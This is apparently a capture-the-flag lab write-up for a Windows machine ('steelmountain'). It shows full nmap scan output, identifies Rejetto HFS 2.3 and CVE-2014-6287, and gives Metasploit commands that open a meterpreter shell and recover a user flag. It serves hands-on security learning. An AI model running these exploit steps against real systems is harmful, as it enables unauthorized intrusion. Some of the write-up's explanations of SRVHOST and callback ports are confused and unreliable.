Task 1  Introduction
---------------------

In this room you will enumerate a Windows machine, gain initial access with Metasploit, use Powershell to further enumerate the machine and escalate your privileges to Administrator.

Please note that this machine does not respond to ping (ICMP) and may take a few minutes to boot up.

1. Who is the employee of the month?

picture Present in the port 80 webserver (hosted)

--> Bill Harper


Task 2  Initial Access
-----------------------

Scan the machine with nmap. What is the other port running a web server on?

```
PORT      STATE SERVICE            REASON  VERSION
80/tcp    open  http               syn-ack Microsoft IIS httpd 8.5
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/8.5
|_http-title: Site doesn't have a title (text/html).
135/tcp   open  msrpc              syn-ack Microsoft Windows RPC
139/tcp   open  netbios-ssn        syn-ack Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds       syn-ack Microsoft Windows Server 2008 R2 - 2012 microsoft-ds
3389/tcp  open  ssl/ms-wbt-server? syn-ack
| ssl-cert: Subject: commonName=steelmountain
| Issuer: commonName=steelmountain
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha1WithRSAEncryption
| Not valid before: 2021-07-08T20:51:28
| Not valid after:  2022-01-07T20:51:28
| MD5:   8709 a020 40c7 71ec 1907 0372 5df5 4657
| SHA-1: 3b81 38bf 7186 0a82 371c 3c1d 443a 9380 bb95 dc5e
| -----BEGIN CERTIFICATE-----
| MIIC3jCCAcagAwIBAgIQITncN5pTTpdHnXhGU++U6jANBgkqhkiG9w0BAQUFADAY
| MRYwFAYDVQQDEw1zdGVlbG1vdW50YWluMB4XDTIxMDcwODIwNTEyOFoXDTIyMDEw
| NzIwNTEyOFowGDEWMBQGA1UEAxMNc3RlZWxtb3VudGFpbjCCASIwDQYJKoZIhvcN
| AQEBBQADggEPADCCAQoCggEBALzk2LgS0GGlrXEskHH8pi0br2id1tecmaIZi93t
| O1lIGrM3iY+P1DUn7xNavZhf+Sn3AP/ON3b7KXPXk8IhWN4gEOdS4BMTrp1X8f/D
| XK2LmDBkbmQkt6MJxEYSut3mfFeLoXR86cofkJSjUzb65VFv79Jhx9LUVvkwRw7t
| uAKaFEzzWmw91TiEDveFyt7XzVUj3wh5QBtzhBhhNEXiMRDRZFYTycxUO8tVCsZ7
| +PYtFuXGqZN8+5564GOk3AusIa7BiCBnmL64gunwyJSowh/FmFBfSAdsYBR/2U7H
| GVLGfYSRboHogwSPkaxcM6BEBV0U2A2Brm72paCgNTT2rNsCAwEAAaMkMCIwEwYD
| VR0lBAwwCgYIKwYBBQUHAwEwCwYDVR0PBAQDAgQwMA0GCSqGSIb3DQEBBQUAA4IB
| AQBZv4CI0Lo9rbjCpY97G3yi5h9eNyxpzgNhpcJlGUC1s5EqfxaTun/dMSA4wkHK
| AZPEJz2mqHS1FWijz0mhMPZoQtWmqiEKsheThAeeijt+zWFiiGBR/kh350qE953n
| UhBiyzIn5fnLIH/IdXkDX88dW59YLvcSh/T/I9I/SSEvHKVnxoK/cwK9jp67jMHx
| yJqYpnouqgRn9/6vCcdPJfyeAtUBPBBESn4zbZuqTmwEPGhKEQcCQ9k4WvCDioCI
| DIr/ee8g3iEXy0aegLrDpEFaQObbNzqGu/7HxUmzhE2EUCkab2APP5YsPUzL+afl
| LMp6NHY3HrfSLMx5V18P/bkh
|_-----END CERTIFICATE-----
|_ssl-date: 2021-07-09T21:01:01+00:00; -1s from scanner time.
8080/tcp  open  http               syn-ack HttpFileServer httpd 2.3
|_http-favicon: Unknown favicon MD5: 759792EDD4EF8E6BC2D1877D27153CB1
| http-methods: 
|_  Supported Methods: GET HEAD POST
|_http-server-header: HFS 2.3
|_http-title: HFS /
49152/tcp open  msrpc              syn-ack Microsoft Windows RPC
49153/tcp open  msrpc              syn-ack Microsoft Windows RPC
49154/tcp open  msrpc              syn-ack Microsoft Windows RPC
49155/tcp open  msrpc              syn-ack Microsoft Windows RPC
49156/tcp open  msrpc              syn-ack Microsoft Windows RPC
49163/tcp open  msrpc              syn-ack Microsoft Windows RPC
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 0s, deviation: 0s, median: 0s
| nbstat: NetBIOS name: STEELMOUNTAIN, NetBIOS user: <unknown>, NetBIOS MAC: 02:28:8b:ec:85:33 (unknown)
| Names:
|   STEELMOUNTAIN<20>    Flags: <unique><active>
|   STEELMOUNTAIN<00>    Flags: <unique><active>
|   WORKGROUP<00>        Flags: <group><active>
| Statistics:
|   02 28 8b ec 85 33 00 00 00 00 00 00 00 00 00 00 00
|   00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
|_  00 00 00 00 00 00 00 00 00 00 00 00 00 00
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 35667/tcp): CLEAN (Couldn't connect)
|   Check 2 (port 24587/tcp): CLEAN (Couldn't connect)
|   Check 3 (port 17430/udp): CLEAN (Failed to receive data)
|   Check 4 (port 39146/udp): CLEAN (Timeout)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2021-07-09T21:00:55
|_  start_date: 2021-07-09T20:51:22

```
--> 8080

2. Take a look at the other web server. What file server is running?

--> rejetto http file server

3. What is the CVE number to exploit this file server?

rejetto http file server: version 2.3

Used `searchsploit`

--> 2014-6287

4. Use Metasploit to get an initial shell. What is the user flag?

```
msfconsole -q
use exploit/windows/http/rejetto_hfs_exec
set RHOSTS <ip>
set RPORT 8080
exploit
```
Port = 8080 as webserver rejetto was running on port 8080

```
SRVHOST    0.0.0.0          yes       The local host or network interface to listen on. This must be an address on the local machine or 0.0.0.0 to listen on all addresses.
SRVPORT    8080             yes       The local port to listen on.
```

> This exploit has three options: SRVHOST, SRVPORT, and URIPATH.

> 1. The _SRVHOST_ optionrefers to the IP address of your current computer (i.e. the one you are using to execute thea ttack) --> Actually for building the **C2 server**

> 2. The _SRVPORT_ option refers to the port you will use for the exploitation.

- In this case: srv port 8080 => i.e. we will create a C2 channel via port 8080 On which webserver is running.

see this:

![](pic1.jpeg?raw=true)

Up in this image, we can see the **meterpreter shell** was able to connect to victim ip on `port: 49401` which we havn't mentioned, done by metasploit it self, but why port **4901** ??


##### If in this case `SRVHOST` is made equal to `0.0.0.0` then we don't have to worry about that much as `0.0.0.0` means any address, but that doesn't mean victim address ( that would be absurd). Here any address means any address in the LAN network of the attacker.

--> b04763b6fcf51fcd7c13abc7db4fd365


Task3: Privilege Escalation
------------------------------


